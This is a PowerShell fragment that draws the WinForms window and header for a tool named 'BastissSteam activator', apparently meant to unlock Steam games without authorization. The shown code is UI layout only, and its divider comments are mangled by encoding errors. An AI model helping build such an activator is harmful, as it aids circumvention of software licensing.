ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  COMPACT LAYOUT
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$PAD=18;$FW=480;$CW=$FW-(2*$PAD);$GAP=10
$HW=[int](($CW-$GAP)/2);$CH=76;$FCH=68

$HH=115;$CY=$HH
# Main view Y offsets (relative)
$R1Y=0;$R2Y=$CH+$GAP
$WEB_Y=$R2Y+$CH+12;$DISC_Y=$WEB_Y+$FCH+$GAP;$TIK_Y=$DISC_Y+$FCH+$GAP
$SAL_Y=$TIK_Y+$FCH+12;$SAL_H=40
$FH=$CY+$SAL_Y+$SAL_H+14

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  FORM
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$form=New-Object System.Windows.Forms.Form
$form.Text="BastissSteam activator"
$form.ClientSize=New-Object System.Drawing.Size($FW,$FH)
$form.StartPosition="CenterScreen";$form.BackColor=$BG
$form.FormBorderStyle="FixedSingle";$form.MaximizeBox=$false

# Icon from logo image
$ib=New-Object System.Drawing.Bitmap(32,32)
$ig=[System.Drawing.Graphics]::FromImage($ib);$ig.SmoothingMode='AntiAlias'
$ig.InterpolationMode='HighQualityBicubic'
$cpIcon=New-Object System.Drawing.Drawing2D.GraphicsPath
$cpIcon.AddEllipse(0,0,32,32);$ig.SetClip($cpIcon)
if($logoFile){
    $srcIcon=[System.Drawing.Image]::FromFile($logoFile.FullName)
    $minI=[Math]::Min($srcIcon.Width,$srcIcon.Height)
    $cxI=[int](($srcIcon.Width-$minI)/2);$cyI=[int](($srcIcon.Height-$minI)/2)
    $ig.DrawImage($srcIcon,(New-Object System.Drawing.Rectangle(0,0,32,32)),(New-Object System.Drawing.Rectangle($cxI,$cyI,$minI,$minI)),[System.Drawing.GraphicsUnit]::Pixel)
    $srcIcon.Dispose()
}
$ig.ResetClip();$cpIcon.Dispose();$ig.Dispose()
$form.Icon=[System.Drawing.Icon]::FromHandle($ib.GetHicon())
$form.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($form.Handle,20,[ref]$v,4)|Out-Null})

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  HEADER
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$hp=New-Object BufferedPanel
$hp.Location=New-Object System.Drawing.Point(0,0)
$hp.Size=New-Object System.Drawing.Size($FW,$HH);$hp.BackColor=$BG
$hp.Add_Paint({
    param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $g.InterpolationMode='HighQualityBicubic'

    # Fonts for header
    $fntMain=New-Object System.Drawing.Font("Bahnschrift SemiBold",26,[System.Drawing.FontStyle]::Bold)
    $fntTag=New-Object System.Drawing.Font("Bahnschrift Light",9)

    # Measure "BastissSteam" as one word
    $titleText="BastissSteam"
    $titleSz=$g.MeasureString($titleText,$fntMain)
    $tagText="activator"
    $tagSz=$g.MeasureString($tagText,$fntTag)

    # Center group: [logo] [title block]
    $titleBlockH=$titleSz.Height + $tagSz.Height - 10
    $groupW=$script:LS + 12 + [Math]::Max($titleSz.Width, $tagSz.Width)
    $startX=[int](($s.Width - $groupW) / 2)

    # Logo
    if ($script:logoBmp) {
        $ly=[int](($s.Height - $script:LS) / 2 - 2)
        $g.DrawImage($script:logoBmp,$startX,$ly,$script:LS,$script:LS)
    }

    # Title "BastissSteam" - cyan gradient
    $tx=$startX+$script:LS+12
    $ty=[int](($s.Height - $titleBlockH) / 2 - 2)

    # Draw with two-tone: "Bastiss" in cyan, "Steam" in white
    $cyanBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(0,200,255))
    $whiteBr=New-Object System.Drawing.SolidBrush($script:White)

    # Measure "Bastiss" part to know where "Steam" starts
    $bastissOnly=$g.MeasureString("Bastiss",$fntMain)
    $g.DrawString("Bastiss",$fntMain,$cyanBr,$tx,$ty)
    # "Steam" right after, no gap
    $steamX=$tx+$bastissOnly.Width-12
    $g.DrawString("Steam",$fntMain,$whiteBr,$steamX,$ty)

    # "activator" tag centered below
    $tagBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80,95,115))
    $tagX=$tx+($titleSz.Width-$tagSz.Width)/2
    $tagY=$ty+$titleSz.Height-10
